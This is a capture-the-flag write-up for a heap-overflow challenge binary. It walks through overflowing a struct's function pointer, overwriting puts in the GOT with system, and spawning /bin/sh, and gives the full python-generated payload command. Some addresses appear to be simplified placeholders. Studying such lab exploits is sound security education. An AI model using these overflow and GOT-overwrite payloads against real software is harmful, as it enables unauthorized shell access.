---
title:  "Writeup: Heap Smash"
date:   2019-05-03 16:00:00
categories: writeup
author: Matt McDonald
layout: post
---

Heap Smash is a binary in the "pwnables" category, meaning we get the source code for
it, but it will be slightly harder than some of the challenges in the lecture category.
Let's take a look at the source code and try to find a vulnerability:

```
struct net{
    char s[16];
    int (*fp)();
};

void unlock_env(){
    setenv("door", "unlocked",1);
}

void you_lose(){
    printf("You lose\n");
    exit(0);
}

int main(int argc, char **argv){
    char *env_name = "door";
    char buffer[60];
    struct net *a; 
    struct net *b;
    
    if(argc < 3){
        printf("%d args, Not Enough Arguments\n", argc);
        exit(0); 
    }

    setenv("door", "locked", 0);
    a = malloc(sizeof(struct net));
    a->fp = you_lose;
    strcpy(a->s, argv[1]);
    a->fp();
    free(a);
    b = malloc(sizeof(struct net));

    if(!strcmp(getenv(env_name), "locked")){
        printf("Closer, but you still lose\n");
        exit(0);
    }

    if(!strcmp(getenv(env_name), "unlocked")){
        printf("now you're on the right track\n");
        //strcpy(buffer, argv[4]); //SMALL CHANGE
        strcpy(b->s, argv[2]);
        strcpy(a->fp, argv[3]);
        //printf ("lets see\n");
        printf("%s\n", argv[4]);
    }
}
```

There's a lot going on here, and it actually looks like there's more than one vulnerability
for us to exploit. Early on, we see that strcpy is used to load in from our user input
into a struct, meaning we have a chance to overflow. Then, if we can somehow make it into the
bottom if statement, we can see that there are two more calls to strcpy. Notably, the final
call to strcpy is operating on ```a->fp```, which is a pointer - this means we could potentially
use this to write to any location in memory we want! But before we can use that exploit, we need
to find a way into the if statement.

Somehow, we need to set the environment variable "door" to "unlocked". Unfortunately, it isn't
as simple as doing this outside of the program, as the door is set to "locked" right at the
start of the program. On the bright side, though, there seems to be a convenient function
called "unlock_env" that does exactly what we need! 

So how can we force the program to call this function for us? By default, the struct "a" is 
allocated and filled with the address of the "you_lose" function, which is then called. If 
we could find a way to replace the value of ```a->fp``` with the unlock function, then we
would make it into the if statement as planned. 

This is a relatively simple exploit, similar to what we performed in heap0. Right before
the function is called, we strcpy into the string field of the pointer, which is 16
bytes long. To overflow this, all we'll need to do is type 16 bytes of garbage, followed
by the address of unlock_env:

```
> objdump -t heap_smash | grep unlock_env
0000000000112233 g     F .text  000000000000001b              unlock_env

> ./heap_smash $(python -c 'print "a"*16 + "\x33\x22\x11\x00"')
now you're on the right track
[1]    293 segmentation fault (core dumped) 
```

Great! Now we're moving forward. But what do we do from here? As we noticed before, the
second strcpy could probably be used to overwrite something in the GOT. Presumably, we would
replace some function with system, and then find a way to pass in /bin/sh as an argument.
But the only function after that strcpy is printf, and unfortunately we only have control over
the second argument, which wouldn't work. Or would it?

Lets open up the executable in GDB, and take a look at the full disassembly. This is a long
one, so I'll cut down to only the relevant parts:

```
> gdb heap_smash
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400809 <+0>:     push   %rbp
   0x000000000040080a <+1>:     mov    %rsp,%rbp
   [...]
   0x0000000000400931 <+296>:   callq  0x400640 <strcpy@plt>
   0x0000000000400936 <+301>:   mov    -0x80(%rbp),%rax
   0x000000000040093a <+305>:   add    $0x18,%rax
   0x000000000040093e <+309>:   mov    (%rax),%rdx
   0x0000000000400941 <+312>:   mov    -0x60(%rbp),%rax
   0x0000000000400945 <+316>:   mov    0x10(%rax),%rax
   0x0000000000400949 <+320>:   mov    %rdx,%rsi
   0x000000000040094c <+323>:   mov    %rax,%rdi
   0x000000000040094f <+326>:   callq  0x400640 <strcpy@plt>
   0x0000000000400954 <+331>:   mov    -0x80(%rbp),%rax
   0x0000000000400958 <+335>:   add    $0x20,%rax
   0x000000000040095c <+339>:   mov    (%rax),%rax
   0x000000000040095f <+342>:   mov    %rax,%rdi
   0x0000000000400962 <+345>:   callq  0x400650 <puts@plt>
   0x0000000000400967 <+350>:   mov    $0x0,%eax
   0x000000000040096c <+355>:   mov    -0x8(%rbp),%rcx
   0x0000000000400970 <+359>:   xor    %fs:0x28,%rcx
   0x0000000000400979 <+368>:   je     0x400980 <main+375>
   0x000000000040097b <+370>:   callq  0x400670 <__stack_chk_fail@plt>
   0x0000000000400980 <+375>:   leaveq
   0x0000000000400981 <+376>:   retq
End of assembler dump.
```

Here, we can see the last two calls to strcpy inside our if statement. But instead of a call to
printf, we have a call to puts! Since the format string was simply just printing the argument
followed by a newline, the compiler optimized it out, and replaced it with a call to puts. This
means that argv[4] is the first parameter to the call to puts, and we can definitely use this to
launch a shell.

So how do we accomplish this? We're going to want to use the first strcpy to overflow the struct
such that the pointer is pointing to the address of puts in the GOT. Then, the second copy will 
change the value there to be equal to the address of system instead. Finally, argv[4] will be
"/bin/sh", and we will launch a shell!

Performing the overflow will be very straightforward, and use almost exactly the same process 
as the first overflow. We just need to find the address of system and the address of puts:

```
(gdb) x/i 0x400650
   0x400650 <puts@plt>: jmpq   *0x2009da(%rip)        # 0x600000
(gdb) p system
$1 = {int (const char *)} 0x7fffff000000 <__libc_system>
```

So to recap:
argv[1] will be 16 bytes of junk, followed by the address of unlock_env, to change the first pointer
argv[2] will be 16 bytes of junk, followed by the address of puts, to change the second pointer
argv[3] will be the address of system, to be written into the GOT
argv[4] will simply be /bin/sh

Let's put it all together and give it a try:

```
./heap_smash $(python -c 'print "a"*16 + "\x33\x22\x11\x00"') 
             $(python -c 'print "a"*16 + "\x00\x00\x60\x00\x00\x00\x00\x00"') 
             $(python -c 'print "\x00\x00\x00\xff\xff\x7f\x00\x00"') 
             /bin/sh
```

With the correct addresses, this should launch an admin shell and allow you to view the flag!